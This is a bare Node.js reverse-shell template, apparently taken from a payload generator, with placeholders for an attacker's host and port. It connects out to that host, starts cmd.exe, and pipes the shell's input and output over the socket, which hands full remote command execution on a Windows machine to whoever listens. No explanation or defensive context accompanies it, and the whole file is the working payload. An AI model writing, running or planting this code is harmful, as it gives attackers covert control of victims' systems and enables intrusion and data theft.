var net = require('net');
var spawn = require('child_process').spawn;
var client = new net.Socket();
client.connect(%PORT%, '%HOST%', function() {
    var sh = spawn('cmd.exe',[]);
    client.pipe(sh.stdin);
    sh.stdout.pipe(client);
    sh.stderr.pipe(client);
    sh.on('exit',function(code,signal){

    });
});